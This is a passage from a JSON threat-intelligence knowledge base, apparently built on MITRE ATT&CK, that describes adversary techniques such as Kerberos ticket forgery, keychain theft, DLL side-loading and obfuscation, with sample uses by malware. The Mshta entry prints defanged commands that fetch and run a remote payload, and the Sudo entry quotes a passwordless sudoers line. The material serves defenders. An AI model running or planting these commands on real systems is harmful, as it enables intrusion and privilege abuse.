    "description": "Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Credentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain access to systems. One example of this is MS14-068, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions. (Citation: Technet MS14-068) (Citation: ADSecurity Detecting Forged Tickets) Exploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.",
    "example_uses": [],
    "id": "T1212",
    "name": "Exploitation for Credential Access",
    "similar_words": [
      "Exploitation for Credential Access"
    ]
  },
  "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82": {
    "description": "Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Scanning](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services. (Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
    "example_uses": [
      "exploited a Windows SMB Remote Code Execution Vulnerability to conduct lateral movement.",
      "can use MS10-061 to exploit a print spooler vulnerability in a remote system with a shared printer in order to move laterally."
    ],
    "id": "T1210",
    "name": "Exploitation of Remote Services",
    "similar_words": [
      "Exploitation of Remote Services"
    ]
  },
  "attack-pattern--9e09ddb2-1746-4448-9cad-7f8b41777d6d": {
    "description": "Keychains are the built-in way for macOS to keep track of users' passwords and credentials for many services and features such as WiFi passwords, websites, secure notes, certificates, and Kerberos. Keychain files are located in ~/Library/Keychains/,/Library/Keychains/, and /Network/Library/Keychains/. (Citation: Wikipedia keychain) The security command-line utility, which is built into macOS by default, provides a useful way to manage these credentials.\n\nTo manage their credentials, users have to use additional credentials to access their keychain. If an adversary knows the credentials for the login keychain, then they can get access to all the other credentials stored in this vault. (Citation: External to DA, the OS X Way) By default, the passphrase for the keychain is the user’s logon credentials.",
    "example_uses": [
      "collects Keychain storage data and copies those passwords/tokens to a file.",
      "collects the keychains on the system."
    ],
    "id": "T1142",
    "name": "Keychain",
    "similar_words": [
      "Keychain"
    ]
  },
  "attack-pattern--9e80ddfb-ce32-4961-a778-ca6a10cfae72": {
    "description": "The sudoers file, /etc/sudoers, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the idea of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like user1 ALL=(ALL) NOPASSWD: ALL (Citation: OSX.Dok Malware). \n\nAdversaries can take advantage of these configurations to execute commands as other users or spawn processes with higher privileges. You must have elevated privileges to edit this file though.",
    "example_uses": [],
    "id": "T1169",
    "name": "Sudo",
    "similar_words": [
      "Sudo"
    ]
  },
  "attack-pattern--9fa07bef-9c81-421e-a8e5-ad4366c5a925": {
    "description": "Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship exploits an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.\n\nOrganizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, [Valid Accounts](https://attack.mitre.org/techniques/T1078) used by the other party for access to internal network systems may be compromised and used.",
    "example_uses": [
      "Once  gained access to the DCCC network, the group then proceeded to use that access to compromise the DNC network.",
      "has used legitimate access granted to Managed Service Providers in order to access victims of interest."
    ],
    "id": "T1199",
    "name": "Trusted Relationship",
    "similar_words": [
      "Trusted Relationship"
    ]
  },
  "attack-pattern--a0a189c8-d3bd-4991-bf6f-153d185ee373": {
    "description": "As of OS X 10.8, mach-O binaries introduced a new header called LC_MAIN that points to the binary’s entry point for execution. Previously, there were two headers to achieve this same effect: LC_THREAD and LC_UNIXTHREAD  (Citation: Prolific OSX Malware History). The entry point for a binary can be hijacked so that initial execution flows to a malicious addition (either another section or a code cave) and then goes back to the initial entry point so that the victim doesn’t know anything was different  (Citation: Methods of Mac Malware Persistence). By modifying a binary in this way, application whitelisting can be bypassed because the file name or application path is still the same.",
    "example_uses": [],
    "id": "T1149",
    "name": "LC_MAIN Hijacking",
    "similar_words": [
      "LC_MAIN Hijacking"
    ]
  },
  "attack-pattern--a10641f4-87b4-45a3-a906-92a149cb2c27": {
    "description": "Account manipulation may aid adversaries in maintaining access to credentials and certain permission levels within an environment. Manipulation could consist of modifying permissions, modifying credentials, adding or changing permission groups, modifying account settings, or modifying how authentication is performed. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to subvert password duration policies and preserve the life of compromised credentials. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain.",
    "example_uses": [
      "added newly created accounts to the administrators group to maintain elevated access.",
      "has been known to add created accounts to local admin groups to maintain elevated access.",
      "adds permissions and remote logins to all users.",
      "is used to patch an enterprise domain controller authentication process with a backdoor password. It allows adversaries to bypass the standard authentication system to use a defined password for all accounts authenticating to that domain controller.",
      "The  credential dumper has been extended to include Skeleton Key domain controller authentication bypass functionality. The LSADUMP::ChangeNTLM and LSADUMP::SetNTLM modules can also manipulate the password hash of an account without knowing the clear text value.",
      "malware WhiskeyDelta-Two contains a function that attempts to rename the administrator’s account."
    ],
    "id": "T1098",
    "name": "Account Manipulation",
    "similar_words": [
      "Account Manipulation"
    ]
  },
  "attack-pattern--a127c32c-cbb0-4f9d-be07-881a792408ec": {
    "description": "Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). HTA files have the file extension .hta. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)\n\nAdversaries can use mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) \n\nFiles may be executed by mshta.exe through an inline script: mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))\n\nThey may also be executed directly from URLs: mshta http[:]//webserver/payload[.]hta\n\nMshta.exe can be used to bypass application whitelisting solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: GitHub SubTee The List)",
    "example_uses": [
      "can use MSHTA to serve additional payloads.",
      "uses mshta.exe to load its program and files.",
      "can use Mshta.exe to execute additional payloads on compromised hosts.",
      "has used Mshta.exe to execute its  payload.",
      "has used mshta.exe to execute VBScript to execute malicious code on victim systems."
    ],
    "id": "T1170",
    "name": "Mshta",
    "similar_words": [
      "Mshta"
    ]
  },
  "attack-pattern--a19e86f8-1c0a-4fea-8407-23b73d615776": {
    "description": "Data exfiltration is performed with a different protocol from the main command and control protocol or channel. The data is likely to be sent to an alternate network location from the main command and control server. Alternate protocols include FTP, SMTP, HTTP/S, DNS, or some other network protocol. Different channels could include Internet Web services such as cloud storage.",
    "example_uses": [
      "has used WinSCP to exfiltrate data from a targeted organization over FTP.",
      "has used FTP to exfiltrate collected data.",
      "connects to a predefined domain on port 443 to exfil gathered information.",
      "can be used to create  to upload files from a compromised host.",
      "has exfiltrated data over FTP separately from its primary C2 channel over DNS.",
      "exfiltrates collected files over FTP or WebDAV. Exfiltration servers can be separately configured from C2 servers.",
      "exfiltrates data by uploading it to accounts created by the actors on Web cloud storage providers for the adversaries to retrieve later.",
      "exfiltrates files over FTP.",
      "can exfiltrate data via a DNS tunnel or email, separately from its C2 channel.",
      "may be used to exfiltrate data separate from the main command and control protocol.",
      "malware SierraBravo-Two generates an email message via SMTP containing information about newly infected victims."
    ],
    "id": "T1048",
    "name": "Exfiltration Over Alternative Protocol",
    "similar_words": [
      "Exfiltration Over Alternative Protocol"
    ]
  },
  "attack-pattern--a257ed11-ff3b-4216-8c9d-3938ef57064c": {
    "description": "Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.\n\nIn this technique, valid Kerberos tickets for [Valid Accounts](https://attack.mitre.org/techniques/T1078) are captured by [Credential Dumping](https://attack.mitre.org/techniques/T1003). A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access. (Citation: ADSecurity AD Kerberos Attacks) (Citation: GentilKiwi Pass the Ticket)\n\nSilver Tickets can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint). (Citation: ADSecurity AD Kerberos Attacks)\n\nGolden Tickets can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory. (Citation: Campbell 2014)",
    "example_uses": [
      "has used  to generate Kerberos golden tickets.",
      "has created forged Kerberos Ticket Granting Ticket (TGT) and Ticket Granting Service (TGS) tickets to maintain administrative access.",
      "’s LSADUMP::DCSync, KERBEROS::Golden, and KERBEROS::PTT modules implement the three steps required to extract the krbtgt account hash and create/use Kerberos tickets.",
      "Some  samples have a module to use pass the ticket with Kerberos for authentication."
    ],
    "id": "T1097",
    "name": "Pass the Ticket",
    "similar_words": [
      "Pass the Ticket"
    ]
  },
  "attack-pattern--a6525aec-acc4-47fe-92f9-b9b4de4b9228": {
    "description": "The Graphical User Interfaces (GUI) is a common way to interact with an operating system. Adversaries may use a system's GUI during an operation, commonly through a remote interactive session such as [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1076), instead of through a [Command-Line Interface](https://attack.mitre.org/techniques/T1059), to search for information and execute files via mouse double-click events, the Windows Run command (Citation: Wikipedia Run Command), or other potentially difficult to monitor interactions.",
    "example_uses": [
      "has interacted with compromised systems to browse and copy files through its graphical user interface in  sessions."
    ],
    "id": "T1061",
    "name": "Graphical User Interface",
    "similar_words": [
      "Graphical User Interface"
    ]
  },
  "attack-pattern--a93494bb-4b80-4ea1-8695-3236a49916fd": {
    "description": "Adversaries may use brute force techniques to attempt access to accounts when passwords are unknown or when password hashes are obtained.\n\n[Credential Dumping](https://attack.mitre.org/techniques/T1003) to obtain password hashes may only get an adversary so far when [Pass the Hash](https://attack.mitre.org/techniques/T1075) is not an option. Techniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table. Cracking hashes is usually done on adversary-controlled systems outside of the target network. (Citation: Wikipedia Password cracking)\n\nAdversaries may attempt to brute force logins without knowledge of passwords or hashes during an operation either with zero knowledge or by attempting a list of known or possible passwords. This is a riskier option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nA related technique called password spraying uses one password, or a small list of passwords, that matches the complexity policy of the domain and may be a commonly used password. Logins are attempted with that password and many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. (Citation: BlackHillsInfosec Password Spraying)",
    "example_uses": [
      "used a tool called BruteForcer to perform a brute force attack.",
      "dropped and executed tools used for password cracking, including Hydra.",
      "has used brute force techniques to obtain credentials.",
      "conducts brute force attacks against SSH services to gain initial access.",
      "has been known to brute force password hashes to be able to leverage plain text credentials.",
      "uses a list of known credentials gathered through credential dumping to guess passwords to accounts as it spreads throughout a network.",
      "malware attempts to connect to Windows shares for lateral movement by using a generated list of usernames, which center around permutations of the username Administrator, and weak passwords.",
      "may attempt to connect to systems within a victim's network using net use commands and a predefined list or collection of passwords."
    ],
    "id": "T1110",
    "name": "Brute Force",
    "similar_words": [
      "Brute Force"
    ]
  },
  "attack-pattern--aa8bfbc9-78dc-41a4-a03b-7453e0fdccda": {
    "description": "macOS and OS X use a common method to look for required dynamic libraries (dylib) to load into a program based on search paths. Adversaries can take advantage of ambiguous paths to plant dylibs to gain privilege escalation or persistence.\n\nA common method is to see what dylibs an application uses, then plant a malicious version with the same name higher up in the search path. This typically results in the dylib being in the same folder as the application itself. (Citation: Writing Bad Malware for OSX) (Citation: Malware Persistence on OS X)\n\nIf the program is configured to run at a higher privilege level than the current user, then when the dylib is loaded into the application, the dylib will also run at that elevated level. This can be used by adversaries as a privilege escalation technique.",
    "example_uses": [],
    "id": "T1157",
    "name": "Dylib Hijacking",
    "similar_words": [
      "Dylib Hijacking"
    ]
  },
  "attack-pattern--ad255bfe-a9e6-4b52-a258-8d3462abe842": {
    "description": "Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, commingling legitimate traffic with C2 communications traffic, or using a non-standard data encoding system, such as a modified Base64 encoding for the message body of an HTTP request.",
    "example_uses": [
      "generates a false TLS handshake using a public certificate to disguise C2 network communications.",
      "encodes C2 communications with base64.",
      "base64 encodes strings that are sent to the C2 over its DNS tunnel.",
      "has retrieved stage 2 payloads as Bitmap images that use Least Significant Bit (LSB) steganography.",
      "can use steganography to hide malicious code downloaded to the victim.",
      "Some  samples use standard Base64 + bzip2, and some use standard Base64 + reverse XOR + RSA-2048 to decrypt data received from C2 servers.",
      "is controlled via commands that are appended to image files.",
      "inserts pseudo-random characters between each original character during encoding of C2 network requests, making it difficult to write signatures on them.",
      "C2 traffic attempts to evade detection by resembling data generated by legitimate messenger applications, such as MSN and Yahoo! messengers.",
      "Newer variants of  will encode C2 communications with a custom system.",
      "After encrypting C2 data,  converts it into a hexadecimal representation and then encodes it into base64.",
      "When the  command and control is operating over HTTP or HTTPS, Duqu uploads data to its controller by appending it to a blank JPG file.",
      "The  malware uses custom Base64 encoding schemes to obfuscate data command and control traffic in the message body of HTTP requests.",
      "obfuscates C2 traffic with an altered version of base64.",
      "added junk data to outgoing UDP packets to peer implants.",
      "added \"junk data\" to each encoded string, preventing trivial decoding without knowledge of the junk removal algorithm. Each implant was given a \"junk length\" value when created, tracked by the controller software to allow seamless communication but prevent analysis of the command protocol on the wire.",
      "The  group has used other forms of obfuscation, include commingling legitimate traffic with communications traffic so that network streams appear legitimate. Some malware that has been used by  also uses steganography to hide communication in PNG image files."
    ],
    "id": "T1001",
    "name": "Data Obfuscation",
    "similar_words": [
      "Data Obfuscation"
    ]
  },
  "attack-pattern--ae676644-d2d2-41b7-af7e-9bed1b55898c": {
    "description": "Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration.\n\nAdversaries may search network shares on computers they have compromised to find files of interest. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information.",
    "example_uses": [
      "extracted Word documents from a file server on a victim network.",
      "has exfiltrated files stolen from file shares.",
      "has collected data from remote systems by mounting network shares with net use and using Robocopy to transfer data.",
      "steals user files from network shared drives with file extensions and keywords that match a predefined list.",
      "When it first starts,  crawls the victim's mapped drives and collects documents with the following extensions: .doc, .docx, .pdf, .ppt, .pptx, and .txt."
    ],
    "id": "T1039",
    "name": "Data from Network Shared Drive",
    "similar_words": [
      "Data from Network Shared Drive"
    ]
  },
  "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81": {
    "description": "Adversaries may steal the credentials of a specific user or service account using Credential Access techniques or capture credentials earlier in their reconnaissance process through social engineering for means of gaining Initial Access. \n\nCompromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nAdversaries may also create accounts, sometimes using pre-defined account names and passwords, as a means for persistence through backup access in case other means are unsuccessful. \n\nThe overlap of credentials and permissions across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise. (Citation: TechNet Credential Theft)",
    "example_uses": [
      "compromised user credentials and used valid accounts for operations.",
      "creates valid users to provide access to the system.",
      "has used valid accounts for privilege escalation.",
      "has utilized  during and.",
      "has used valid, compromised email accounts for defense evasion, including to send malicious emails to other victim organizations.",
      "has used legitimate VPN, RDP, Citrix, or VNC credentials to maintain access to a victim environment.",
      "leverages valid accounts after gaining credentials for use within the victim domain.",
      "has used compromised credentials to access other systems on a victim network.",
      "has used legitimate local admin account credentials.",
      "Adversaries can instruct  to spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means). The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware.",
      "has used legitimate credentials to maintain access to a victim network and exfiltrate data. The group also used credentials stolen through a spearphishing email to login to the DCCC network.",
      "has used stolen credentials to connect remotely to victim networks using VPNs protected with only a single factor. The group has also moved laterally using the Local Administrator account.",
      "has used valid accounts shared between Managed Service Providers and clients to move between the two environments.",
      "can use known credentials to run commands and spawn processes as another user.",
      "If  cannot access shares using current privileges, it attempts access using hard coded, domain-specific credentials gathered earlier in the intrusion.",
      "Some  samples have a module to extract email from Microsoft Exchange servers using compromised credentials.",
      "used legitimate account credentials that they dumped to navigate the internal victim network as though they were the legitimate account owner.",
      "To move laterally on a victim network,  has used credentials stolen from various systems on which it gathered usernames and password hashes.",
      "actors used compromised credentials for the victim's endpoint management platform, Altiris, to move laterally.",
      "actors obtain legitimate credentials using a variety of methods and use them to further lateral movement on victim networks.",
      "actors leverage legitimate credentials to log into external remote services.",
      "attempts to obtain legitimate credentials during operations.",
      "actors used legitimate credentials of banking employees to perform operations that sent them millions of dollars."
    ],
    "id": "T1078",
    "name": "Valid Accounts",
    "similar_words": [
      "Valid Accounts"
    ]
  },
  "attack-pattern--b2001907-166b-4d71-bb3c-9d26c871de09": {
    "description": "Programs may specify DLLs that are loaded at runtime. Programs that improperly or vaguely specify a required DLL may be open to a vulnerability in which an unintended DLL is loaded. Side-loading vulnerabilities specifically occur when Windows Side-by-Side (WinSxS) manifests (Citation: MSDN Manifests) are not explicit enough about characteristics of the DLL to be loaded. Adversaries may take advantage of a legitimate program that is vulnerable to side-loading to load a malicious DLL. (Citation: Stewart 2014)\n\nAdversaries likely use this technique as a means of masking actions they perform under a legitimate, trusted system or software process.",
    "example_uses": [
      "launched an HTTP malware variant and a Port 22 malware variant using a legitimate executable that loaded the malicious DLL.",
      "uses DLL side-loading to load malicious programs.",
      "ran genuinely-signed executables from Symantec and McAfee which loaded a malicious DLL called rastls.dll.",
      "A  .dll that contains  is loaded and executed using DLL side-loading.",
      "has used DLL side-loading to load malicious payloads.",
      "A  variant has used DLL side-loading.",
      "has been known to side load DLLs with a valid version of Chrome with one of their tools.",
      "side loads a malicious file, sspisrv.dll, in part of a spoofed lssas.exe service.",
      "has used DLL side-loading.",
      "DLL side-loading has been used to execute  through a legitimate Citrix executable ssonsvr.exe which is vulnerable to the technique. The Citrix executable was dropped along with  by the dropper.",
      "typically loads its DLL file into a legitimate signed Java or VMware executable.",
      "has been loaded onto Exchange servers and disguised as an ISAPI filter (DLL file). The IIS w3wp.exe process then loads the malicious DLL.",
      "has used to use DLL side-loading to evade anti-virus and to maintain persistence on a victim.",
      "During the  installation process, it drops a copy of the legitimate Microsoft binary igfxtray.exe. The executable contains a side-loading weakness which is used to load a portion of the malware.",
      "uses DLL side-loading, typically using a digitally signed sample of Kaspersky Anti-Virus (AV) 6.0 for Windows Workstations or McAfee's Outlook Scan About Box to load malicious DLL files.",
      "has used DLL side-loading to launch versions of Mimikatz and PwDump6 as well as .",
      "actors have used DLL side-loading. Actors have used legitimate Kaspersky anti-virus variants in which the DLL acts as a stub loader that loads and executes the shell code."
    ],
    "id": "T1073",
    "name": "DLL Side-Loading",
    "similar_words": [
      "DLL Side-Loading"
    ]
  },
  "attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839": {
    "description": "Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform Privilege Escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This may be a necessary step for an adversary compromising a endpoint system that has been properly configured and limits other privilege escalation methods.",
    "example_uses": [
      "has used exploits to increase their levels of rights and privileges.",
      "has leveraged a zero-day vulnerability to escalate privileges.",
      "has exploited the CVE-2016-0167 local vulnerability.",
      "exploits CVE-2016-4117 to allow an executable to gain escalated privileges.",
      "can exploit vulnerabilities such as MS14-058.",
      "has used CVE-2016-7255 to escalate privileges.",
      "attempts to exploit privilege escalation vulnerabilities CVE-2010-0232 or CVE-2010-4398.",
      "has exploited CVE-2015-1701 and CVE-2015-2387 to escalate privileges.",
      "has a plugin to drop and execute vulnerable Outpost Sandbox or avast! Virtualization drivers in order to gain kernel mode privileges.",
      "has used CVE-2014-6324 to escalate privileges.",
      "has used tools to exploit Windows vulnerabilities in order to escalate privileges. The tools targeted CVE-2013-3660, CVE-2011-2005, and CVE-2010-4398, all of which could allow local users to access kernel-level privileges.",
      "has used CVE-2014-4076, CVE-2015-2387, and CVE-2015-1701 to escalate privileges."
    ],
    "id": "T1068",
    "name": "Exploitation for Privilege Escalation",
    "similar_words": [
      "Exploitation for Privilege Escalation"
    ]
  },
  "attack-pattern--b39d03cb-7b98-41c4-a878-c40c1a913dc0": {
    "description": "Service principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service (Citation: Microsoft Detecting Kerberoasting Feb 2018)). (Citation: Microsoft SPN) (Citation: Microsoft SetSPN) (Citation: SANS Attacking Kerberos Nov 2014) (Citation: Harmj0y Kerberoast Nov 2016)\n\nAdversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC). (Citation: Empire InvokeKerberoast Oct 2016) (Citation: AdSecurity Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline [Brute Force](https://attack.mitre.org/techniques/T1110) attacks that may expose plaintext credentials. (Citation: AdSecurity Cracking Kerberos Dec 2015) (Citation: Empire InvokeKerberoast Oct 2016) (Citation: Harmj0y Kerberoast Nov 2016)\n\nThis same attack could be executed using service tickets captured from network traffic. (Citation: AdSecurity Cracking Kerberos Dec 2015)\n\nCracked hashes may enable Persistence, Privilege Escalation, and  Lateral Movement via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078). (Citation: SANS Attacking Kerberos Nov 2014)",
    "example_uses": [
      "Invoke-Kerberoast module can request service tickets and return crackable ticket hashes."
    ],
    "id": "T1208",
    "name": "Kerberoasting",
    "similar_words": [
      "Kerberoasting"
    ]
  },
  "attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a": {
    "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.\n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as Javascript.\n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)\n\nAdversaries may also obfuscate commands executed from payloads or directly via a [Command-Line Interface](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and whitelisting mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017) (Citation: PaloAlto EncodedCommand March 2017)\n\nAnother example of obfuscation is through the use of steganography, a technique of hiding messages or code in images, audio tracks, video clips, or text files. One of the first known and reported adversaries that used steganography activity surrounding [Invoke-PSImage](https://attack.mitre.org/software/S0231). The Duqu malware encrypted the gathered information from a victim's system and hid it into an image followed by exfiltrating the image to a C2 server. (Citation: Wikipedia Duqu) By the end of 2017, an adversary group used [Invoke-PSImage](https://attack.mitre.org/software/S0231) to hide PowerShell commands in an image file (png) and execute the code on a victim's system. In this particular case the PowerShell code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary. (Citation: McAfee Malicious Doc Targets Pyeongchang Olympics)",
    "example_uses": [
      "has obfuscated strings in  by base64 encoding, and then encrypting them.",
      "DLL file and non-malicious decoy file are encrypted with RC4.",
      "is obfuscated using the open source ConfuserEx protector.  also obfuscates the name of created files/folders/mutexes and encrypts debug messages written to log files using the Rijndael cipher.",
      "uses an 8-byte XOR key to obfuscate API names and other strings contained in the payload.",
      "The PowerShell script with the  payload was obfuscated using the COMPRESS technique in Invoke-Obfuscation.",
      "obfuscated several scriptlets and code used on the victim’s machine, including through use of XOR.",
      "sends images to users that are embedded with shellcode and obfuscates strings and payloads.",
      "A  tool can encrypt payloads using XOR.  malware is also obfuscated using Metasploit’s shikata_ga_nai encoder as well as compressed with LZNT1 compression.",
      "has encoded strings in its malware with base64 as well as with a simple, single-byte XOR obfuscation using key 0x40.",
      "is heavily obfuscated in many ways, including through the use of spaghetti code in its functions in an effort to confuse disassembly programs. It also uses a custom XOR algorithm to obfuscate code.",
      "encrypts strings to make analysis more difficult.",
      "uses RC4 and Base64 to obfuscate strings.",
      "A  variant is encoded using a simple XOR cipher.",
      "was likely obfuscated using Invoke-Obfuscation.",
      "used Base64 to obfuscate commands and the payload.",
      "’s Java payload is encrypted with AES.",
      "’s installer is obfuscated with a custom crypter to obfuscate the installer.",
      "has obfuscated a script with Crypto Obfuscator.",
      "downloads additional files that are base64-encoded and encrypted with another cipher.",
      "encodes files in Base64.",
      "hides any strings related to its own indicators of compromise.",
      "APIs and strings in some  variants are RC4 encrypted. Another variant is encoded with XOR.",
      "encrypts strings in the backdoor using a custom XOR algorithm.",
      "executes and stores obfuscated Perl scripts.",
      "uses non-descriptive names to hide functionality and uses an AES CBC (256 bits) encryption algorithm for its loader and configuration files.",
      "drops files with base64-encoded data.",
      "avoids analysis by encrypting all strings, internal files, configuration data.",
      "uses the Confuser protector to obfuscate an embedded .Net Framework assembly used for C2.  also encodes collected data in hexadecimal format before writing to files on disk and obfuscates strings.",
      "is obfuscated using the obfuscation tool called ConfuserEx.",
      "uses a simple one-byte XOR method to obfuscate values in the malware.",
      "payloads are obfuscated prior to compilation to inhibit analysis and/or reverse engineering.",
      "obfuscated scripts that were used on victim machines.",
      "supports file encryption (AES with the key \"lolomycin2017\").",
      "A  uses a encrypted and compressed payload that is disguised as a bitmap within the resource section of the installer.",
      "Some  strings are base64 encoded, such as the embedded DLL known as MockDll.",
      "first stage shellcode contains a NOP sled with alternative instructions that was likely designed to bypass antivirus tools.",
      "has used environment variables and standard input (stdin) to obfuscate command-line arguments.  also obfuscates malicious macros delivered as payloads.",
      "has encrypted documents and malicious executables.",
      "has used Daniel Bohannon’s Invoke-Obfuscation framework. The group also used files with base64 encoded PowerShell commands.",
      "uses basic obfuscation in the form of spaghetti code.",
      "is loaded and executed by a highly obfuscated launcher.",
      "can be used to embed a PowerShell script within the pixels of a PNG file.",
      "Some strings in are obfuscated with XOR x56.",
      "has obfuscated code using base64 and gzip compression.",
      "contains a collection of ScriptModification modules that compress and encode scripts and payloads.",
      "uses character replacement,  environment variables, and XOR encoding to obfuscate code.",
      "has encrypted its payload with RC4.",
      "has used fragmented strings, environment variables, standard input (stdin), and native character-replacement functionalities to obfuscate commands.",
      "has encrypted and encoded data in its malware, including by using base64.",
      "obfuscates files or information to help evade defensive measures.",
      "uses encrypted Windows APIs and also encrypts data using the alternative base64+RC4 or the Caesar cipher.",
      "malware has used base64-encoded commands and files, and has also encrypted embedded strings with AES.",
      "The  config file is encrypted with RC4.",
      "obfuscates API function names using a substitute cipher combined with Base64 encoding.",
      "logs its actions into files that are encrypted with 3DES. It also uses RSA to encrypt resources.",
      "is obfuscated with the off-the-shelf SmartAssembly .NET obfuscator created by red-gate.com.",
      "encrypts some of its files with XOR.",
      "The  dropper uses a function to obfuscate the name of functions and other parts of the malware.",
      "code may be obfuscated through structured exception handling and return-oriented programming.",
      "Variants of  encrypt payloads using various XOR ciphers, as well as a custom algorithm that uses the \"srand\" and \"rand\" functions.",
      "contains base64-encoded strings.",
